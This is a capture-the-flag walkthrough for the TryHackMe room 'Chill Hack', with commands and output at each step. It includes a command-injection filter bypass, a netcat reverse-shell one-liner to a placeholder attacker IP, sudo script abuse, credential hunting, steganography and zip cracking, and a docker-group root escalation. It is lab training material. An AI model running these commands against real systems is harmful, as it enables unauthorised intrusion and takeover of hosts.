# Chill Hack

Room: https://tryhackme.com/room/chillhack

Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/chillhack.md

---

## Enumeration

### Nmap

```bash
nmap <TARGET_IP>
```

Output:

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-08 05:08 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for <TARGET_IP>
Host is up (0.0026s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

Open ports:

| Port | Service | Notes |
| --- | --- | --- |
| 21 | FTP | Anonymous login works |
| 22 | SSH | Later used for `anurodh` |
| 80 | HTTP | Web app with command injection |

## FTP enumeration

Login anonymously and retrieve the note.

```bash
ftp <TARGET_IP>
```

Inside FTP:

```text
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.11 secs (0.8302 kB/s)
ftp> exit
221 Goodbye.
```

Read the note:

```bash
cat note.txt
```

Output:

```text
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

This gives two likely usernames:

```text
anurodh
apaar
```

It also hints that a command input exists somewhere, but some strings are filtered.

## HTTP enumeration

### Gobuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Output:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://<TARGET_IP>/css/]
/fonts                (Status: 301) [Size: 310] [--> http://<TARGET_IP>/fonts/]
/images               (Status: 301) [Size: 311] [--> http://<TARGET_IP>/images/]
/index.html           (Status: 200) [Size: 35184]
/js                   (Status: 301) [Size: 307] [--> http://<TARGET_IP>/js/]
/secret               (Status: 301) [Size: 311] [--> http://<TARGET_IP>/secret/]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The interesting directory is:

```text
http://<TARGET_IP>/secret/
```

## Command injection in `/secret/`

The `/secret/` page allows command input.

Testing:

```text
whoami
```

Output:

```text
www-data
```

Testing `ls` alone returned the filter message:

```text
Are you a hacker?
```

But chaining commands worked:

```text
whoami;ls
```

Output:

```text
www-data images index.php
```

That confirms command injection and gives a bypass for the simple filter.

## Initial shell as `www-data`

Start a listener:

```bash
nc -lvnp 9001
```

Use the command injection field to run a reverse shell. Replace `<ATTACKER_IP>` with your VPN or tun0 IP.

```bash
whoami; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 9001 >/tmp/f
```

Listener output:

```text
pingu@nootnoot:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on <TARGET_IP> 53314
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-<REDACTED>:/var/www/html/secret$
```

## Enumerating `apaar`

Move to `/home/apaar`:

```bash
cd /home/apaar
ls -la
```

Output:

```text
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 6 root  root  4096 May  8 04:06 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
```

Read the helper script:

```bash
cat .helpline.sh
```

Output:

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

The key line is:

```bash
$msg 2>/dev/null
```

Whatever is entered as the message is executed as a command.

## `www-data` to `apaar`

Check sudo privileges:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for www-data on ip-<REDACTED>:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-<REDACTED>:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Run the script as `apaar`:

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

Input `/bin/bash` as the message:

```text
Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: tr
Hello user! I am tr,  Please enter your message: /bin/bash
whoami
apaar
python3 -c 'import pty; pty.spawn("/bin/bash")'
apaar@ip-<REDACTED>:/var/www/html/secret$
```

Read the user flag:

```bash
cd /home/apaar
cat local.txt
```

Output redacted:

```text
{USER-FLAG: REDACTED}
```

## Post-user enumeration

A SUID check did not show a custom obvious win.

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

Output:

```text
root root 4755 /usr/lib/openssh/ssh-keysign
root root 4755 /usr/lib/snapd/snap-confine
root root 4755 /usr/lib/policykit-1/polkit-agent-helper-1
root messagebus 4754 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
root root 4755 /usr/lib/eject/dmcrypt-get-device
root root 4755 /usr/bin/sudo
root root 4755 /usr/bin/gpasswd
root root 4755 /usr/bin/newgrp
root root 4755 /usr/bin/pkexec
root root 4755 /usr/bin/passwd
daemon daemon 6755 /usr/bin/at
root root 4755 /usr/bin/chfn
root root 4755 /usr/bin/chsh
root root 4755 /bin/su
root root 4755 /bin/mount
root root 4755 /bin/fusermount
root root 4755 /bin/umount
root root 4755 /snap/snapd/23771/usr/lib/snapd/snap-confine
root root 4755 /snap/core20/2501/usr/bin/chfn
root root 4755 /snap/core20/2501/usr/bin/chsh
root root 4755 /snap/core20/2501/usr/bin/gpasswd
root root 4755 /snap/core20/2501/usr/bin/mount
root root 4755 /snap/core20/2501/usr/bin/newgrp
root root 4755 /snap/core20/2501/usr/bin/passwd
root root 4755 /snap/core20/2501/usr/bin/su
root root 4755 /snap/core20/2501/usr/bin/sudo
root root 4755 /snap/core20/2501/usr/bin/umount
root systemd-resolve 4754 /snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
root root 4755 /snap/core20/2501/usr/lib/openssh/ssh-keysign
```

The better path is in the web files.

## Web file credential hunting

Search for credentials:

```bash
grep -RIn "password\|passwd\|user\|db\|mysql\|secret\|key" /var/www 2>/dev/null
```

Interesting hit:

```text
/var/www/files/index.php:12:            $con = new PDO("mysql:dbname=webportal;host=localhost","root","<MYSQL_PASSWORD_REDACTED>");
```

Connect to MySQL:

```bash
mysql -u root -p'<MYSQL_PASSWORD_REDACTED>' webportal
```

Output:

```text
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)
```

Enumerate the database:

```sql
show databases;
use webportal;
show tables;
select * from users;
```

Output:

```text
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal;
Database changed

mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

The hashes crack as MD5, but in our run they did not work directly as Linux user passwords.

```text
7e53614ced3640d5de23f111806cc4fd:REDACTED
686216240e5af30df0501e53c789a649:REDACTED
```

They are useful for the web portal path rather than direct `su`.

## Image and steganography path

In the web files, the image folder contained:

```text
002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg
```

Working directory:

```text
/var/www/files/images
```

Extract hidden data from the JPG:

```bash
steghide --extract -sf hacker-with-laptop_23-2147985341.jpg
```

Output:

```text
Enter passphrase:
wrote extracted data to "backup.zip".
```

The passphrase was blank in our run.

## Crack `backup.zip`

Convert the ZIP to a John hash:

```bash
zip2john backup.zip > backup.hash
```

Crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

Output redacted:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<ZIP_PASSWORD_REDACTED>        (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2026-05-08 06:37) 33.33g/s 409600p/s 409600c/s 409600C/s toodles..havana
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzip it:

```bash
unzip -P '<ZIP_PASSWORD_REDACTED>' backup.zip
```

Output:

```text
Archive:  backup.zip
  inflating: source_code.php
```

Read the source:

```bash
cat source_code.php
```

Relevant redacted source:

```php
<html>
<head>
    Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
            Email: <input type="email" name="email" placeholder="email"><br><br>
            Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
        </form>
<?php
        if(isset($_POST['submit']))
    {
        $email = $_POST["email"];
        $password = $_POST["password"];
        if(base64_encode($password) == "IWQwbnxxxxxxxxNzdzByZA==")
        { 
            $random = rand(1000,9999);?><br><br><br>
            <form method="POST">
                Enter the OTP: <input type="number" name="otp">
                <input type="submit" name="submitOtp" value="Submit">
            </form>
        <?php   mail($email,"OTP for authentication",$random);
            if(isset($_POST["submitOtp"]))
                {
                    $otp = $_POST["otp"];
                    if($otp == $random)
                    {
                        echo "Welcome Anurodh!";
                        header("Location: authenticated.php");
                    }
                    else
                    {
                        echo "Invalid OTP";
                    }
                }
        }
        else
        {
            echo "Invalid Username or Password";
        }
        }
?>
</html>
```

Decode the base64 value:

```bash
echo 'IWQwbnRLxxxxxxHNzdzByZA==' | base64 -d
```

Output redacted:

```text
<ANURODH_PASSWORD_REDACTED>
```

The source also tells us the target user:

```text
Welcome Anurodh!
```

## SSH as `anurodh`

```bash
ssh anurodh@<TARGET_IP>
```

Password:

```text
<ANURODH_PASSWORD_REDACTED>
```

Successful login:

```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
anurodh@ip-<REDACTED>:~$
```

Check groups:

```bash
id
```

Output:

```text
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

The important finding is:

```text
docker
```

Membership in the Docker group is usually root-equivalent if the user can mount the host filesystem into a container.

## Root via Docker group

Check local images:

```bash
docker images
```

Output:

```text
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
alpine        latest    a24bb4013296   5 years ago   5.57MB
hello-world   latest    bf756fb1ae65   6 years ago   13.3kB
```

Trying Ubuntu failed because the host could not pull from Docker Hub:

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash
```

Output:

```text
Unable to find image 'ubuntu:latest' locally

docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)

Run 'docker run --help' for more information
```

Use the local Alpine image instead:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Output:

```text
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

Read the root flag:

```bash
cd /root
ls
cat proof.txt
```

Output redacted:

```text
proof.txt  snap

{ROOT-FLAG: REDACTED}
```

## Lessons learned

- FTP notes are often hints for the next service rather than standalone loot.
- Simple command filters can sometimes be bypassed with chaining, escaping, or alternate command forms.
- Always run `sudo -l` after landing a shell.
- Scripts that execute user-controlled input are dangerous, especially when reachable through sudo as another user.
- Web app database credentials may lead to local-only services, hidden portals, source code, or stego material rather than direct system passwords.
- Docker group membership is a common Linux privilege escalation path.
